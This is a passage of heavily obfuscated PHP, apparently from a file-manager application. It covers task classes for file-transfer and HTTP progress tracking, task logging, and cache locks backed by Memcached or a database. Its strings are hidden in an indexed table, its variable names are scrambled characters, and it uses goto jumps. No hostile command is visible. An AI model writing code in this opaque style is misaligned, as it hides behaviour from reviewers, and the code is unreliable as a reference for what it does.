$_SERVER[³½¬ÚË¯]; $¤ç·ÍÊŒ = $•ï¤­ø²[12]; if (!empty($°å®ŸÄ)) { $°å®ŸÄ = explode($•ï¤­ø²[50], $°å®ŸÄ); if (count($°å®ŸÄ) > 1) { $¤ç·ÍÊŒ .= $•ï¤­ø²[51] . $°å®ŸÄ[1] . $•ï¤­ø²[52] . $°å®ŸÄ[0] . $•ï¤­ø²[53]; } else { $¤ç·ÍÊŒ .= $•ï¤­ø²[51] . $°å®ŸÄ[0] . $•ï¤­ø²[53]; } } return $¤ç·ÍÊŒ; } } goto A½óšµÁõ; BæÛÓöÌ™º: class TaskFileTransfer extends Task { protected function startAfter() { $åŞáêÁğ =& $_SERVER[³½¬ÚË¯]; $†¸Ê…Ü =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($åŞáêÁğ[1720], array($this, $åŞáêÁğ[1721])); Hook::bind($åŞáêÁğ[1266], array($this, $åŞáêÁğ[1722])); Hook::bind($åŞáêÁğ[1723], array($this, $åŞáêÁğ[1724])); Hook::bind($åŞáêÁğ[637], array($this, $åŞáêÁğ[1725])); Hook::bind($åŞáêÁğ[638], array($this, $åŞáêÁğ[1726])); Hook::bind($åŞáêÁğ[644], array($this, $åŞáêÁğ[1727])); Hook::bind($åŞáêÁğ[645], array($this, $åŞáêÁğ[1728])); Hook::bind($åŞáêÁğ[640], array($this, $åŞáêÁğ[1729])); Hook::bind($åŞáêÁğ[642], array($this, $åŞáêÁğ[1730])); Hook::bind($åŞáêÁğ[606], array($this, $åŞáêÁğ[1731])); Hook::bind($åŞáêÁğ[603], array($this, $åŞáêÁğ[1731])); Hook::bind($åŞáêÁğ[608], array($this, $åŞáêÁğ[1731])); Hook::bind($åŞáêÁğ[610], array($this, $åŞáêÁğ[1731])); Hook::bind($åŞáêÁğ[612], array($this, $åŞáêÁğ[1731])); Hook::bind($åŞáêÁğ[1732], array($this, $åŞáêÁğ[1733])); Hook::bind($åŞáêÁğ[628], array($this, $åŞáêÁğ[1734])); $this->sourceModelCopyFlag = !1; Hook::bind($åŞáêÁğ[1735], array($this, $åŞáêÁğ[1736])); Hook::bind($åŞáêÁğ[1737], array($this, $åŞáêÁğ[1738])); Hook::bind($åŞáêÁğ[1739], array($this, $åŞáêÁğ[1740])); $†¸Ê…Ü[$åŞáêÁğ[1741]] = LNG($åŞáêÁğ[1742]); $†¸Ê…Ü[$åŞáêÁğ[1743]] = 0; $†¸Ê…Ü[$åŞáêÁğ[1744]] = 0; $†¸Ê…Ü[$åŞáêÁğ[1107]] = $åŞáêÁğ[12]; $†¸Ê…Ü[$åŞáêÁğ[1745]] = $åŞáêÁğ[12]; $†¸Ê…Ü[$åŞáêÁğ[1746]] = 0; $†¸Ê…Ü[$åŞáêÁğ[1747]] = 0; $†¸Ê…Ü[$åŞáêÁğ[1748]] = 0; if (!$†¸Ê…Ü[$åŞáêÁğ[1587]]) { $†¸Ê…Ü[$åŞáêÁğ[1587]] = LNG($åŞáêÁğ[1749]); } } protected function endAfter() { $ÂŞâ¨œ =& $_SERVER[³½¬ÚË¯]; Hook::unbind($ÂŞâ¨œ[1720], array($this, $ÂŞâ¨œ[1721])); Hook::unbind($ÂŞâ¨œ[1266], array($this, $ÂŞâ¨œ[1722])); Hook::unbind($ÂŞâ¨œ[1723], array($this, $ÂŞâ¨œ[1724])); Hook::unbind($ÂŞâ¨œ[637], array($this, $ÂŞâ¨œ[1725])); Hook::unbind($ÂŞâ¨œ[638], array($this, $ÂŞâ¨œ[1726])); Hook::unbind($ÂŞâ¨œ[644], array($this, $ÂŞâ¨œ[1727])); Hook::unbind($ÂŞâ¨œ[645], array($this, $ÂŞâ¨œ[1728])); Hook::unbind($ÂŞâ¨œ[640], array($this, $ÂŞâ¨œ[1729])); Hook::unbind($ÂŞâ¨œ[642], array($this, $ÂŞâ¨œ[1730])); Hook::unbind($ÂŞâ¨œ[606], array($this, $ÂŞâ¨œ[1731])); Hook::unbind($ÂŞâ¨œ[603], array($this, $ÂŞâ¨œ[1731])); Hook::unbind($ÂŞâ¨œ[608], array($this, $ÂŞâ¨œ[1731])); Hook::unbind($ÂŞâ¨œ[610], array($this, $ÂŞâ¨œ[1731])); Hook::unbind($ÂŞâ¨œ[612], array($this, $ÂŞâ¨œ[1731])); Hook::unbind($ÂŞâ¨œ[1732], array($this, $ÂŞâ¨œ[1733])); Hook::unbind($ÂŞâ¨œ[628], array($this, $ÂŞâ¨œ[1734])); Hook::unbind($ÂŞâ¨œ[1735], array($this, $ÂŞâ¨œ[1736])); Hook::unbind($ÂŞâ¨œ[1737], array($this, $ÂŞâ¨œ[1738])); Hook::unbind($ÂŞâ¨œ[1739], array($this, $ÂŞâ¨œ[1740])); } public function copyMoveStart($Ò¶ı‘¼, $›œ©£üú, $æØï°êò, $Ã¤ç“·„) { $×üµìïŞ =& $_SERVER[³½¬ÚË¯]; self::log($×üµìïŞ[1750] . $›œ©£üú . $×üµìïŞ[70] . $Ã¤ç“·„); $‰û™¢Œ£ = rtrim(TEMP_FILES, $×üµìïŞ[8]); if (substr($›œ©£üú, 0, strlen($‰û™¢Œ£)) == $‰û™¢Œ£) { return; } if (substr($Ã¤ç“·„, 0, strlen($‰û™¢Œ£)) == $‰û™¢Œ£) { return; } $ÜßÖ€š– =& $this->task; $ÜßÖ€š–[$×üµìïŞ[1751]] = KodIO::transferType($Ò¶ı‘¼, $æØï°êò); $this->update(); } public function updateAfter() { $¨÷³õÙ« =& $_SERVER[³½¬ÚË¯]; $’‚Í‹ë =& $this->task; if (!$’‚Í‹ë[$¨÷³õÙ«[799]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($’‚Í‹ë[$¨÷³õÙ«[1751]] == $¨÷³õÙ«[1358]) { return; } self::updateTask($’‚Í‹ë); } private static function updateTask(&$‘®ı» ü) { $©É©éˆ‘ =& $_SERVER[³½¬ÚË¯]; if ($‘®ı» ü[$©É©éˆ‘[1751]] == $©É©éˆ‘[1237] || $‘®ı» ü[$©É©éˆ‘[1751]] == $©É©éˆ‘[107]) { if ($‘®ı» ü[$©É©éˆ‘[1745]]) { $‘®ı» ü[$©É©éˆ‘[1748]] = $‘®ı» ü[$©É©éˆ‘[1747]] + $‘®ı» ü[$©É©éˆ‘[1744]]; } } else { if ($‘®ı» ü[$©É©éˆ‘[1751]] == $©É©éˆ‘[1359]) { if ($‘®ı» ü[$©É©éˆ‘[1745]] == $©É©éˆ‘[1237]) { $‘®ı» ü[$©É©éˆ‘[1748]] = $‘®ı» ü[$©É©éˆ‘[1747]] + $‘®ı» ü[$©É©éˆ‘[1744]] * 0.5; } else { if ($‘®ı» ü[$©É©éˆ‘[1745]] == $©É©éˆ‘[107]) { $‘®ı» ü[$©É©éˆ‘[1748]] = $‘®ı» ü[$©É©éˆ‘[1747]] + $‘®ı» ü[$©É©éˆ‘[1743]] * 0.5 + $‘®ı» ü[$©É©éˆ‘[1744]] * 0.5; } } } } $‘®ı» ü[$©É©éˆ‘[1692]] = $‘®ı» ü[$©É©éˆ‘[1748]] / $‘®ı» ü[$©É©éˆ‘[799]]; if ($‘®ı» ü[$©É©éˆ‘[1692]] > 0) { $¸²¿®ïö = timeFloat() - $‘®ı» ü[$©É©éˆ‘[1694]] - $‘®ı» ü[$©É©éˆ‘[1697]]; $‘®ı» ü[$©É©éˆ‘[1698]] = $¸²¿®ïö * (1 - $‘®ı» ü[$©É©éˆ‘[1692]]) / $‘®ı» ü[$©É©éˆ‘[1692]]; } } public function addPath($±¹ê¿ñ) { $…­°©–´ =& $_SERVER[³½¬ÚË¯]; if (!$±¹ê¿ñ) { return; } $–·øı×¢ =& $this->task; $óî½¨ë = IO::infoWithChildren($±¹ê¿ñ); $¶š”Üé¶ = $–·øı×¢[$…­°©–´[1752]] ? $–·øı×¢[$…­°©–´[1752]][$…­°©–´[1753]] : 0; $–·øı×¢[$…­°©–´[1752]] = array($…­°©–´[1753] => $¶š”Üé¶ + 1, $…­°©–´[462] => $óî½¨ë[$…­°©–´[32]], $…­°©–´[84] => $óî½¨ë[$…­°©–´[84]], $…­°©–´[552] => $óî½¨ë[$…­°©–´[552]] ? $óî½¨ë[$…­°©–´[552]] : $óî½¨ë[$…­°©–´[84]]); if ($óî½¨ë[$…­°©–´[33]] == $…­°©–´[214]) { $–·øı×¢[$…­°©–´[822]] += 1; } else { $–·øı×¢[$…­°©–´[822]] += $óî½¨ë[$…­°©–´[79]][$…­°©–´[77]]; if ($óî½¨ë[$…­°©–´[181]]) { $–·øı×¢[$…­°©–´[822]] += $óî½¨ë[$…­°©–´[79]][$…­°©–´[78]] + 1; } } $–·øı×¢[$…­°©–´[799]] += $óî½¨ë[$…­°©–´[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($úñ°¬¤‰) { } public function sourceAddHashEnd($ ô·¥·Ø) { } public function sourceAddFileStart($­›Ñêè’) { $‡ù¯Ê¶å =& $_SERVER[³½¬ÚË¯]; $Î®ÈóÀ¢ =& $this->task; $Î®ÈóÀ¢[$‡ù¯Ê¶å[1743]] = $­›Ñêè’[$‡ù¯Ê¶å[76]]; $Î®ÈóÀ¢[$‡ù¯Ê¶å[1741]] = $­›Ñêè’[$‡ù¯Ê¶å[32]]; $Î®ÈóÀ¢[$‡ù¯Ê¶å[1107]] = $­›Ñêè’[$‡ù¯Ê¶å[32]]; $Î®ÈóÀ¢[$‡ù¯Ê¶å[1754]] = $­›Ñêè’[$‡ù¯Ê¶å[84]]; $this->update(); } public function sourceAddFileEnd($úâ‘Ş°) { $†•ìÕÅÆ =& $_SERVER[³½¬ÚË¯]; $›Ëæ¬ÙŒ =& $this->task; $›Ëæ¬ÙŒ[$†•ìÕÅÆ[1748]] += $úâ‘Ş°[$†•ìÕÅÆ[76]]; $›Ëæ¬ÙŒ[$†•ìÕÅÆ[1754]] = $úâ‘Ş°[$†•ìÕÅÆ[84]]; $this->update(1); } public function copyFileStart($¥ÈÚ÷É‘, $¶áëÆ„Ö, $æ¾çûÌ, $Ùãíô¼°, $Â¥˜­Äö, $ñëØ„¨æ) { $†“ñÏ±‚ =& $_SERVER[³½¬ÚË¯]; $ğË³€×¡ = $Â¥˜­Äö; if ($ğË³€×¡ == $GLOBALS[$†“ñÏ±‚[1755]]) { $ğË³€×¡ = $GLOBALS[$†“ñÏ±‚[1756]]; } $GLOBALS[$†“ñÏ±‚[1756]] = $Â¥˜­Äö; $GLOBALS[$†“ñÏ±‚[1755]] = $ñëØ„¨æ; $–ğ²”ã =& $this->task; $–ğ²”ã[$†“ñÏ±‚[1741]] = $ğË³€×¡; $–ğ²”ã[$†“ñÏ±‚[1743]] = (int) $¥ÈÚ÷É‘->size($¶áëÆ„Ö); $–ğ²”ã[$†“ñÏ±‚[1744]] = 0; $–ğ²”ã[$†“ñÏ±‚[1107]] = $†“ñÏ±‚[12]; $–ğ²”ã[$†“ñÏ±‚[1745]] = $†“ñÏ±‚[12]; $–ğ²”ã[$†“ñÏ±‚[1746]] = 0; $Ô ¤ŠÕ¡ = $–ğ²”ã[$†“ñÏ±‚[1743]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($–ğ²”ã[$†“ñÏ±‚[443]] . $†“ñÏ±‚[1757]); if ($Ô ¤ŠÕ¡ && file_exists(get_path_father($Ùãíô¼°))) { Cache::set($–ğ²”ã[$†“ñÏ±‚[443]] . $†“ñÏ±‚[1757], $Ùãíô¼°); $–ğ²”ã[$†“ñÏ±‚[1714]] = array($†“ñÏ±‚[1758], $†“ñÏ±‚[1759]); } $this->update(0, $Ô ¤ŠÕ¡); } public static function updateCopyLocalFileSize($àıŞÇØ) { $ˆŞöÃ†ù =& $_SERVER[³½¬ÚË¯]; $¼¤úö·ƒ = Cache::get($àıŞÇØ[$ˆŞöÃ†ù[443]] . $ˆŞöÃ†ù[1757]); if (!$¼¤úö·ƒ || !file_exists($¼¤úö·ƒ)) { return $àıŞÇØ; } $àıŞÇØ[$ˆŞöÃ†ù[1744]] = @filesize($¼¤úö·ƒ); $àıŞÇØ[$ˆŞöÃ†ù[1748]] += $àıŞÇØ[$ˆŞöÃ†ù[1744]]; self::updateTask($àıŞÇØ); return $àıŞÇØ; } public function copyFileEnd($ğšÒı”, $‡ƒÃÖÜ“, $ß©‘º¾À, $¥æÆ„Ë¸, $Êø¤¬¸, $„©ìÃå­) { $©ÂáÉó =& $_SERVER[³½¬ÚË¯]; $…‹¶³¥ó =& $this->task; $…‹¶³¥ó[$©ÂáÉó[1744]] = $…‹¶³¥ó[$©ÂáÉó[1743]]; $…‹¶³¥ó[$©ÂáÉó[1745]] = $©ÂáÉó[12]; unset($…‹¶³¥ó[$©ÂáÉó[1714]]); if ($Êø¤¬¸ == $…‹¶³¥ó[$©ÂáÉó[1741]]) { $…‹¶³¥ó[$©ÂáÉó[1747]] += $…‹¶³¥ó[$©ÂáÉó[1743]]; $…‹¶³¥ó[$©ÂáÉó[1748]] = $…‹¶³¥ó[$©ÂáÉó[1747]]; $›‚ìûØ = 1; if (isset($…‹¶³¥ó[$©ÂáÉó[1754]]) && $…‹¶³¥ó[$©ÂáÉó[1754]] == $‡ƒÃÖÜ“) { $›‚ìûØ = 0; } $this->update($›‚ìûØ); } else { $this->update(); $…‹¶³¥ó[$©ÂáÉó[1744]] = 0; } Cache::remove($…‹¶³¥ó[$©ÂáÉó[443]] . $©ÂáÉó[1757]); self::log($©ÂáÉó[1760] . $‡ƒÃÖÜ“ . $©ÂáÉó[70] . $¥æÆ„Ë¸ . $©ÂáÉó[246] . $Êø¤¬¸ . $©ÂáÉó[1761] . $…‹¶³¥ó[$©ÂáÉó[1741]]); } public function updateFileEnd($öÂ‚‰£, $È‹Ç¾ãÊ) { $ÎĞ™‚·› =& $_SERVER[³½¬ÚË¯]; $Æ”†°ò­ =& $this->task; $Æ”†°ò­[$ÎĞ™‚·›[1741]] = $öÂ‚‰£; $Æ”†°ò­[$ÎĞ™‚·›[1743]] = $È‹Ç¾ãÊ; $Æ”†°ò­[$ÎĞ™‚·›[1747]] += $È‹Ç¾ãÊ; $Æ”†°ò­[$ÎĞ™‚·›[1748]] = $Æ”†°ò­[$ÎĞ™‚·›[1747]]; $this->update(1); self::log($ÎĞ™‚·›[1762] . $öÂ‚‰£); } public function sourceModelCopy($‹»ğğñú) { $åÆîìÇŸ =& $_SERVER[³½¬ÚË¯]; $—÷º½Ö = $‹»ğğñú[0]; $‡Ş—„Å = $‹»ğğñú[1]; $ôŸ™Ö—Õ =& $this->task; $this->sourceModelCopyFlag = !0; $ú”Á¼ÚØ = 0; switch ($—÷º½Ö) { case $åÆîìÇŸ[604]: $ú”Á¼ÚØ = 1; break; case $åÆîìÇŸ[607]: $ôŸ™Ö—Õ[$åÆîìÇŸ[1741]] = $‡Ş—„Å[$åÆîìÇŸ[32]]; break; case $åÆîìÇŸ[609]: $ú”Á¼ÚØ = intval($‹»ğğñú[$åÆîìÇŸ[424]] * 0.4); break; case $åÆîìÇŸ[611]: $ú”Á¼ÚØ = intval($‹»ğğñú[$åÆîìÇŸ[424]] * 0.2); break; case $åÆîìÇŸ[613]: $ú”Á¼ÚØ = intval($‹»ğğñú[$åÆîìÇŸ[424]] * 0.4); break; } $this->update($ú”Á¼ÚØ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($÷œÇ˜ìÀ, $ı¼İ˜–…) { $¤àê·Œ¿ =& $_SERVER[³½¬ÚË¯]; $this->sourceModelCopyFlag = !0; $ÛŞÃ‘«Ë = 1; if (isset($÷œÇ˜ìÀ[$¤àê·Œ¿[79]])) { $ÛŞÃ‘«Ë = $÷œÇ˜ìÀ[$¤àê·Œ¿[79]][$¤àê·Œ¿[77]]; $ÛŞÃ‘«Ë = $ÛŞÃ‘«Ë + $÷œÇ˜ìÀ[$¤àê·Œ¿[79]][$¤àê·Œ¿[78]] + 1; } $this->update($ÛŞÃ‘«Ë); $this->sourceModelCopyFlag = !1; } public function sourceMove($¡Ğù–¯À) { $this->sourceRemove($¡Ğù–¯À, !1); } public function curlProgress($–„Ìœú, $§ñŠÏÑá, $¼˜ƒöş©, $ïÓ§Ô¨×, $â“–’¡) { $òü–Û =& $_SERVER[³½¬ÚË¯]; $ª«÷è =& $this->task; if ($â“–’¡ > 0) { $ª«÷è[$òü–Û[1107]] = $òü–Û[1763]; $ª«÷è[$òü–Û[1745]] = $òü–Û[107]; if ($ª«÷è[$òü–Û[1743]]) { $ª«÷è[$òü–Û[1744]] = $â“–’¡; } if ($ª«÷è[$òü–Û[1746]]) { $ª«÷è[$òü–Û[1744]] = $â“–’¡ + $ª«÷è[$òü–Û[1746]]; } } else { if ($¼˜ƒöş© > 0) { if ($ª«÷è[$òü–Û[1743]] == $§ñŠÏÑá) { $ª«÷è[$òü–Û[1744]] = $¼˜ƒöş©; $ª«÷è[$òü–Û[1107]] = $òü–Û[1764]; $ª«÷è[$òü–Û[1745]] = $òü–Û[1237]; } } } $this->update(); } public function curlProgressStart($ˆ«¼„àà) { } public function curlProgressEnd($©üóÓ„ê) { $ÍÅ÷áŒÛ =& $_SERVER[³½¬ÚË¯]; $Ì¬ã»†¹ =& $this->task; $Ü¤™ëØ… = curl_getinfo($©üóÓ„ê); $Ÿ¿ƒÎÚ = $Ü¤™ëØ…[$ÍÅ÷áŒÛ[1765]]; if ($Ÿ¿ƒÎÚ == -1) { $Ÿ¿ƒÎÚ = $Ü¤™ëØ…[$ÍÅ÷áŒÛ[1766]]; } if ($Ì¬ã»†¹[$ÍÅ÷áŒÛ[1745]] == $ÍÅ÷áŒÛ[107] && $Ÿ¿ƒÎÚ) { $Ì¬ã»†¹[$ÍÅ÷áŒÛ[1746]] += $Ÿ¿ƒÎÚ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÅˆÛû…Û =& $_SERVER[³½¬ÚË¯]; $Ü¡½ÍÛ¢ =& $this->task; $Ü¡½ÍÛ¢[$ÅˆÛû…Û[1767]] = 1; Hook::bind($ÅˆÛû…Û[1735], array($this, $ÅˆÛû…Û[1768])); Hook::bind($ÅˆÛû…Û[1737], array($this, $ÅˆÛû…Û[1769])); Hook::bind($ÅˆÛû…Û[1739], array($this, $ÅˆÛû…Û[1770])); } protected function endAfter() { $Ã¥¢Äê± =& $_SERVER[³½¬ÚË¯]; Hook::unbind($Ã¥¢Äê±[1735], array($this, $Ã¥¢Äê±[1768])); Hook::unbind($Ã¥¢Äê±[1737], array($this, $Ã¥¢Äê±[1769])); Hook::unbind($Ã¥¢Äê±[1739], array($this, $Ã¥¢Äê±[1770])); } public function progressStart($“‡Àµ–) { $¶ãéø– =& $_SERVER[³½¬ÚË¯]; $¨‚”²ï = curl_getinfo($“‡Àµ–); self::log($¶ãéø–[1771] . $¨‚”²ï[$¶ãéø–[351]]); self::valueSet($this->task[$¶ãéø–[443]], $this->task); } public function progressEnd($×€«¤›) { $“Íø­ª± =& $_SERVER[³½¬ÚË¯]; self::log($“Íø­ª±[1772] . $this->task[$“Íø­ª±[443]]); $this->end(); } public function progress($Î’õ®à÷, $ºÅÛã®’, $ğ¨èöï€, $¶õ”ùİŸ, $ğ‚ÍËËÎ) { $çÙ¶™¦ò =& $_SERVER[³½¬ÚË¯]; $¿êğ›¨ =& $this->task; if ($ğ‚ÍËËÎ > 0) { $¿êğ›¨[$çÙ¶™¦ò[822]] = $¿êğ›¨[$çÙ¶™¦ò[822]] == 0 ? $¶õ”ùİŸ : $¿êğ›¨[$çÙ¶™¦ò[822]]; $¿êğ›¨[$çÙ¶™¦ò[1691]] = $ğ‚ÍËËÎ; } else { if ($ğ¨èöï€ > 0) { $¿êğ›¨[$çÙ¶™¦ò[822]] = $¿êğ›¨[$çÙ¶™¦ò[822]] == 0 ? $ºÅÛã®’ : $¿êğ›¨[$çÙ¶™¦ò[822]]; $¿êğ›¨[$çÙ¶™¦ò[1691]] = $ğ¨èöï€; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\163\x73\110\164\x74\x70\x3a\144\157\167\x6e\x3a{$ğ¨èöï€}\57{$ºÅÛã®’}\x3b\40\x75\160\154\157\x61\144\72{$ğ‚ÍËËÎ}\x2f{$¶õ”ùİŸ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ËÄÂá²ó, $“ç³Àµ³ = '', $áØâ÷ÆÙ = 0, $¡°½´±› = '') { $œ”ßĞè =& $_SERVER[³½¬ÚË¯]; $Í¯ä´äş = new Task($ËÄÂá²ó, $“ç³Àµ³, $áØâ÷ÆÙ, $¡°½´±›); $GLOBALS[$œ”ßĞè[1773] . $ËÄÂá²ó] = new TaskLog($œ”ßĞè[1674], $Í¯ä´äş, $¡°½´±›); return $Í¯ä´äş; } public function __construct($çŠ«ñ«• = '', $ßºÏîüî = '', $ª†ä°× = '') { $¤Œ•ß•Œ =& $_SERVER[³½¬ÚË¯]; if (!$çŠ«ñ«•) { $çŠ«ñ«• = $¤Œ•ß•Œ[1674]; } $×ÎİØ²Ÿ = $çŠ«ñ«• . $¤Œ•ß•Œ[430] . rand_string(10); if (!$ª†ä°×) { $ª†ä°× = $çŠ«ñ«• . $¤Œ•ß•Œ[53] . $ª†ä°×; } switch ($çŠ«ñ«•) { case $¤Œ•ß•Œ[1674]: if (!$ßºÏîüî || !$ßºÏîüî->task) { return echoLog($çŠ«ñ«• . $¤Œ•ß•Œ[1774]); } $Øé÷øú = $ßºÏîüî; $×ÎİØ²Ÿ = $Øé÷øú->task[$¤Œ•ß•Œ[443]]; $çŠ«ñ«• = $Øé÷øú->task[$¤Œ•ß•Œ[443]]; if (!$Øé÷øú->task[$¤Œ•ß•Œ[1587]]) { $Øé÷øú->task[$¤Œ•ß•Œ[1587]] = $ª†ä°× ? $ª†ä°× : $çŠ«ñ«•; } break; case $¤Œ•ß•Œ[1775]: if (!$ßºÏîüî) { return echoLog($çŠ«ñ«• . $¤Œ•ß•Œ[1776]); } $œ®İş¼„ = is_string($ßºÏîüî) ? array($ßºÏîüî) : $ßºÏîüî; $Øé÷øú = new TaskFileTransfer($×ÎİØ²Ÿ, $çŠ«ñ«•, 0, $ª†ä°× ? $ª†ä°× : $œ®İş¼„[0]); foreach ($œ®İş¼„ as $ãÂÈıÌŠ) { $Øé÷øú->addPath($ãÂÈıÌŠ); } break; case $¤Œ•ß•Œ[357]: if (!$ßºÏîüî) { return echoLog($çŠ«ñ«• . $¤Œ•ß•Œ[1776]); } $œ®İş¼„ = is_string($ßºÏîüî) ? array($ßºÏîüî) : $ßºÏîüî; $Øé÷øú = new TaskZip($×ÎİØ²Ÿ, $çŠ«ñ«•, 0, $ª†ä°× ? $ª†ä°× : $œ®İş¼„[0]); foreach ($œ®İş¼„ as $ãÂÈıÌŠ) { $Øé÷øú->addPath($ãÂÈıÌŠ); } break; case $¤Œ•ß•Œ[1257]: if (!$ßºÏîüî) { return echoLog($çŠ«ñ«• . $¤Œ•ß•Œ[1776]); } $Øé÷øú = new TaskUnZip($×ÎİØ²Ÿ, $çŠ«ñ«•, 0, $ª†ä°× ? $ª†ä°× : $ßºÏîüî); if ($ßºÏîüî) { $Øé÷øú->addFile($ßºÏîüî); } break; case $¤Œ•ß•Œ[149]: $Øé÷øú = new TaskHttp($×ÎİØ²Ÿ, $çŠ«ñ«•); break; default: return; break; } $this->task = $Øé÷øú; $this->taskID = $×ÎİØ²Ÿ; Hook::bind($¤Œ•ß•Œ[1711], array($this, $¤Œ•ß•Œ[1777])); Hook::bind($¤Œ•ß•Œ[1713], array($this, $¤Œ•ß•Œ[1778])); Hook::bind($¤Œ•ß•Œ[1707], array($this, $¤Œ•ß•Œ[1779])); echoLog($¤Œ•ß•Œ[1780] . $Øé÷øú->task[$¤Œ•ß•Œ[1587]]); } public function __destruct() { $this->end(); } public function end($‡ïò§¡ = '') { $íÑ½£ı =& $_SERVER[³½¬ÚË¯]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($‡ïò§¡); $this->task = !1; $this->taskID = !1; Hook::unbind($íÑ½£ı[1711], array($this, $íÑ½£ı[1777])); Hook::unbind($íÑ½£ı[1713], array($this, $íÑ½£ı[1778])); Hook::unbind($íÑ½£ı[1707], array($this, $íÑ½£ı[1779])); } public function taskUpdate($À§õ‹©²) { $ü£Ï²—¯ =& $_SERVER[³½¬ÚË¯]; if (!$À§õ‹©² || $this->taskID != $À§õ‹©²[$ü£Ï²—¯[443]]) { return; } $‚öë «• = 20; $â£ÔıÑ½ = intval($À§õ‹©²[$ü£Ï²—¯[1692]] * $‚öë «•); $µñšŒÖ = $ü£Ï²—¯[163] . str_repeat($ü£Ï²—¯[927], $â£ÔıÑ½) . $ü£Ï²—¯[1057] . str_repeat($ü£Ï²—¯[53], $‚öë «• - $â£ÔıÑ½) . $ü£Ï²—¯[165]; $‹šËå‘ = $µñšŒÖ . sprintf($ü£Ï²—¯[1781], $À§õ‹©²[$ü£Ï²—¯[1692]] * 100) . $ü£Ï²—¯[1782]; $…İø€åÂ = $‹šËå‘ . $À§õ‹©²[$ü£Ï²—¯[1691]] . $ü£Ï²—¯[8] . $À§õ‹©²[$ü£Ï²—¯[822]] . LNG($ü£Ï²—¯[1783]); $¦‹Óƒ—ª = $ü£Ï²—¯[12]; if ($À§õ‹©²[$ü£Ï²—¯[1767]]) { $…İø€åÂ = $‹šËå‘ . size_format($À§õ‹©²[$ü£Ï²—¯[1691]]) . $ü£Ï²—¯[8] . size_format($À§õ‹©²[$ü£Ï²—¯[822]]); $¦‹Óƒ—ª = size_format($À§õ‹©²[$ü£Ï²—¯[1693]]) . $ü£Ï²—¯[1784]; } if ($À§õ‹©²[$ü£Ï²—¯[1107]]) { $À§õ‹©²[$ü£Ï²—¯[1741]] = $À§õ‹©²[$ü£Ï²—¯[1107]] . $ü£Ï²—¯[53] . $À§õ‹©²[$ü£Ï²—¯[1741]]; } if ($À§õ‹©²[$ü£Ï²—¯[1741]]) { $×ÜğÛâÄ = $ü£Ï²—¯[12]; if ($À§õ‹©²[$ü£Ï²—¯[1743]]) { $×ÜğÛâÄ = $ü£Ï²—¯[50] . size_format($À§õ‹©²[$ü£Ï²—¯[1744]]) . $ü£Ï²—¯[8] . size_format($À§õ‹©²[$ü£Ï²—¯[1743]]); } $¦‹Óƒ—ª .= $À§õ‹©²[$ü£Ï²—¯[1741]] . $×ÜğÛâÄ; } if ($À§õ‹©²[$ü£Ï²—¯[799]] && !$À§õ‹©²[$ü£Ï²—¯[1743]]) { $¦‹Óƒ—ª .= $ü£Ï²—¯[53] . size_format($À§õ‹©²[$ü£Ï²—¯[1748]]) . $ü£Ï²—¯[8] . size_format($À§õ‹©²[$ü£Ï²—¯[799]]); } echoLog($…İø€åÂ . $ü£Ï²—¯[53] . $¦‹Óƒ—ª, !0); } public function taskEnd($šë¹ŞÚş) { $÷”‡ãİ£ =& $_SERVER[³½¬ÚË¯]; if (!$šë¹ŞÚş || $this->taskID != $šë¹ŞÚş[$÷”‡ãİ£[443]]) { return; } $ğÓ²€éå = $šë¹ŞÚş ? $šë¹ŞÚş[$÷”‡ãİ£[1691]] . $÷”‡ãİ£[8] . $šë¹ŞÚş[$÷”‡ãİ£[822]] . LNG($÷”‡ãİ£[1783]) . $÷”‡ãİ£[71] : $÷”‡ãİ£[12]; echoLog($÷”‡ãİ£[1785] . $šë¹ŞÚş[$÷”‡ãİ£[1587]] . ($šë¹ŞÚş[$÷”‡ãİ£[494]] ? $÷”‡ãİ£[71] . $šë¹ŞÚş[$÷”‡ãİ£[494]] : $÷”‡ãİ£[12]) . $÷”‡ãİ£[71] . $ğÓ²€éå . $÷”‡ãİ£[1786] . sprintf($÷”‡ãİ£[887], timeFloat() - $šë¹ŞÚş[$÷”‡ãİ£[1694]]) . $÷”‡ãİ£[1706]); $this->end(); } public function taskKill($ÙßĞı¡) { $™ŒÄ˜¾  =& $_SERVER[³½¬ÚË¯]; if (!$ÙßĞı¡ || $this->taskID != $ÙßĞı¡[$™ŒÄ˜¾ [443]]) { return; } echoLog($™ŒÄ˜¾ [1787] . $ÙßĞı¡[$™ŒÄ˜¾ [1587]]); } } goto BôÌéÏ‰; fÕª¢ù¨½: class CacheLockMemcached { public function lock($¢éÂØª, $ä»«£±± = 0) { $õ«ƒŒÒ— = Cache::init(); $Ô¸¿«òš = microtime(!0) + $ä»«£±±; while (microtime(!0) < $Ô¸¿«òš) { $™ß°ŒÑ¾ = $õ«ƒŒÒ—->get($¢éÂØª); if (!$™ß°ŒÑ¾ || $™ß°ŒÑ¾ < microtime(!0)) { $¼½äŠ‰ = $õ«ƒŒÒ—->handle->add($¢éÂØª, $Ô¸¿«òš, $ä»«£±±); if ($¼½äŠ‰) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($çìƒÖÔ) { return Cache::init()->get($çìƒÖÔ); } public function unlock($š’Ì¤³¨) { return Cache::init()->remove($š’Ì¤³¨); } } class CacheLockDatabase { public function lock($ûù‹ª´, $Ç®ßÇÔ‚ = 0) { $®ÛôÒöİ = Model($_SERVER[³½¬ÚË¯][865]); $‹Œ”—² = microtime(!0) + $Ç®ßÇÔ‚; while (microtime(!0) < $‹Œ”—²) { $¦ñì£µ = $®ÛôÒöİ->get($ûù‹ª´); if (!$¦ñì£µ || $¦ñì£µ < microtime(!0)) { $·ìÔáåÜ = $®ÛôÒöİ->set($ûù‹ª´, $‹Œ”—²); if ($·ìÔáåÜ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($›õ¼Ì°) { return Model($_SERVER[³½¬ÚË¯][865])->get($›õ¼Ì°); } public function unlock($²€Êà) { Model($_SERVER[³½¬ÚË¯][865])->remove($²€Êà); } } class CacheMemcached { 